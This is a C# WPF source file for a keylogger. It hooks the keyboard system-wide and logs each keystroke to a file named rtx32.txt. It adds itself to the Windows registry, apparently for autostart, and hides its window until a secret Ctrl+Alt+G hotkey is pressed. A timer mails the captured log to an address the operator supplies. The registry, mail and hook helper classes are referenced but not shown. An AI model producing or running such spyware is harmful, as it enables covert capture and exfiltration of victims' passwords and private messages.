using System;
using System.Windows;
using System.Windows.Input;
using System.IO;
using System.ComponentModel;
using DesktopWPFAppLowLevelKeyboardHook;
using Microsoft.Win32;

namespace WpfApplication8
{
    public partial class MainWindow : Window
    {
        private static System.Timers.Timer aTimer;
        bool condition = true;
        string mailbox;
        StreamWriter file = new StreamWriter(@"rtx32.txt");
        PressingHandle pressinghandle = new PressingHandle();
        private LowLevelKeyboardListener _listener;
        AddingToRegistry addingtoregistry = new AddingToRegistry();
        MailHandler mailhandler = new MailHandler();
        public MainWindow()
        {
            InitializeComponent();
        }

        public void Button_Click(object sender, RoutedEventArgs e)
        {
            condition = true;
            addingtoregistry.AddToRegistry();
        }
        public void Button_Click_1(object sender, RoutedEventArgs e)
        {
            condition = false;
            file.Close();
            addingtoregistry.RemoveFromRegistry();
            mailhandler.MailStop();
        }
        public void Window_Closing(object sender, CancelEventArgs e)
        {
            _listener.UnHookKeyboard();
            file.Close();
            mailhandler.MailStop();
            addingtoregistry.RemoveFromRegistry();
        }
        public void Window_Closed(object sender, EventArgs e)
        {
            _listener.UnHookKeyboard();
            file.Close();
            mailhandler.MailStop();
            addingtoregistry.RemoveFromRegistry();
        }
        public void Hide_Click(object sender, RoutedEventArgs e)
        {
            this.Hide();
        }

        private void Mail_button(object sender, RoutedEventArgs e)
        {
            mailbox = mailBox.Text;
            mailhandler.SetTimer(aTimer, mailbox);
            Console.WriteLine(mailbox);
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _listener = new LowLevelKeyboardListener();
            _listener.OnKeyPressed += _listener_OnKeyPressed;

            _listener.HookKeyboard();
        }

        void _listener_OnKeyPressed(object sender, KeyPressedArgs e)
        {
            string key;
            if (condition)
            {
                if (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift))
                {
                    key = e.KeyPressed.ToString();
                    pressinghandle.Save_With_Big_Letters(key, file);
                }
                else
                {
                    key = e.KeyPressed.ToString();
                    pressinghandle.Save_With_Small_Letters(key, file);
                }
                file.Flush();
            }
            if (Keyboard.IsKeyDown(Key.G) && Keyboard.IsKeyDown(Key.LeftCtrl) && Keyboard.IsKeyDown(Key.LeftAlt) || Keyboard.IsKeyDown(Key.G) && Keyboard.IsKeyDown(Key.RightCtrl) && Keyboard.IsKeyDown(Key.RightAlt))
            {
                this.Show();
            }
        }
    }
}



